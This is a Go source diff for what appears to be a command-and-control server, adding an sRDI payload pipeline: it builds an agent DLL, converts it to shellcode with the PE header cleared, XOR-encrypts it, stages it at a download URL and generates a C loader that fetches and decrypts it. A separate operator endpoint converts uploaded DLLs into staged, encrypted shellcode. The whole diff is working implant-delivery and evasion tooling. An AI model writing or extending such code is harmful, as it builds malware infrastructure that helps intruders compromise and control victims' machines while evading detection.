@@ -53,6 +53,7 @@ func (s *Server) operatorMux() *http.ServeMux {
 	mux.HandleFunc("/api/build",   s.requireRole(RoleOperator, s.apiBuild))
 	mux.HandleFunc("/api/deliver", s.requireRole(RoleOperator, s.apiDeliver))
 	mux.HandleFunc("/api/donut",   s.requireRole(RoleOperator, s.apiDonut))
+	mux.HandleFunc("/api/srdi",    s.requireRole(RoleOperator, s.apiSRDI))
 	mux.HandleFunc("/api/encode",  s.requireRole(RoleOperator, s.apiEncode))
 	mux.HandleFunc("/api/gencert", s.requireRole(RoleOperator, s.apiGenCert))
 	mux.HandleFunc("/api/rsocks",  s.requireRole(RoleOperator, s.apiRSocks))
@@ -1158,6 +1159,59 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			result["bin_stage"] = binURL
 		}
 
+	case cfg.Format == "srdi":
+		// Build DLL → convert to PIC shellcode via sRDI → XOR-encrypt → stage → C loader
+		dllPath, err := BuildDLL(cfg, payloadsDir)
+		if err != nil {
+			jsonErr(w, "build dll: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		result["dll"] = dllPath
+		srdiFlags := 0x1 // clear PE header on load
+		binPath, err := BuildSRDI(dllPath, "StartAgent", nil, srdiFlags, payloadsDir)
+		if err != nil {
+			jsonErr(w, "sRDI convert: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		result["bin"] = binPath
+		rawBin, err := os.ReadFile(binPath)
+		if err != nil {
+			jsonErr(w, "read srdi bin: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		key, _ := xorKey()
+		encBin := xorBytes(rawBin, key)
+		encBinPath := binPath + ".enc"
+		if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
+			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
+		if err != nil {
+			jsonErr(w, "stage srdi bin: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		stageBase := cfg.StageURL
+		if stageBase == "" {
+			stageBase = cfg.ServerURL
+		}
+		binURL := stageBase + "/stage/" + binToken
+		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
+		op := operatorFromCert(r)
+		s.printf("[%s] sRDI shellcode: %dKB → staged %s\n", op, len(rawBin)/1024, binURL)
+		loaderPath, err := BuildCLoader(cfg, binURL, keyHex, deliveryDir)
+		if err != nil {
+			jsonErr(w, "build loader-c: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		result["loader"] = loaderPath
+		result["bin_stage"] = binURL
+		result["raw_kb"] = fmt.Sprintf("%d", len(rawBin)/1024)
+		result["key_hex"] = keyHex
+		s.printf("[%s] build srdi: stage=%s key=%s\n", op, binURL[:min(len(binURL), 60)], keyHex)
+		jsonOK(w, result)
+		return
+
 	case cfg.Format == "bin":
 		// Raw shellcode only — build EXE then convert to .bin via donut
 		exePath, err := BuildEXE(cfg, payloadsDir)
@@ -1546,6 +1600,80 @@ func (s *Server) apiDonut(w http.ResponseWriter, r *http.Request) {
 		jsonErr(w, "read shellcode: "+err.Error(), http.StatusInternalServerError)
 		return
 	}
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Write(sc)
+}
+
+// apiSRDI accepts a raw Windows DLL (POST body) and returns raw sRDI shellcode.
+// Optional query params: func=<exportName> (default ""), flags=<hex int> (default 0x1=clearHeader).
+// Mirrors /api/donut but uses sRDI instead of donut.
+func (s *Server) apiSRDI(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
+		return
+	}
+	body, err := io.ReadAll(io.LimitReader(r.Body, 64<<20))
+	if err != nil || len(body) == 0 {
+		jsonErr(w, "empty body", http.StatusBadRequest)
+		return
+	}
+
+	funcName := r.URL.Query().Get("func")
+	flags := 0x1 // clear PE header by default
+	if q := r.URL.Query().Get("flags"); q != "" {
+		fmt.Sscanf(q, "0x%x", &flags)
+	}
+	stage := r.URL.Query().Get("stage") == "1"
+
+	tmpDir, err := os.MkdirTemp("", "srdi_")
+	if err != nil {
+		jsonErr(w, "tempdir: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+	defer os.RemoveAll(tmpDir)
+	tmpDLL := tmpDir + "/payload.dll"
+	if err := os.WriteFile(tmpDLL, body, 0600); err != nil {
+		jsonErr(w, "write: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	binPath, err := BuildSRDI(tmpDLL, funcName, nil, flags, tmpDir)
+	if err != nil {
+		jsonErr(w, "sRDI: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	sc, err := os.ReadFile(binPath)
+	if err != nil {
+		jsonErr(w, "read shellcode: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	if stage {
+		// XOR-encrypt and stage the shellcode; return JSON with URL+key
+		payloadsDir := filepath.Join(projectRoot(), "bin", "delivery")
+		os.MkdirAll(payloadsDir, 0755)
+		encPath := filepath.Join(payloadsDir, "srdi_"+filepath.Base(tmpDLL)+".enc")
+		key, _ := xorKey()
+		encBin := xorBytes(sc, key)
+		if err := os.WriteFile(encPath, encBin, 0600); err != nil {
+			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		token, err := RegisterStage(encPath, "application/octet-stream", 5)
+		if err != nil {
+			jsonErr(w, "stage: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
+		jsonOK(w, map[string]string{
+			"stage_token": token,
+			"key_hex":     keyHex,
+			"size_kb":     fmt.Sprintf("%d", len(sc)/1024),
+		})
+		return
+	}
+
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Write(sc)
 }
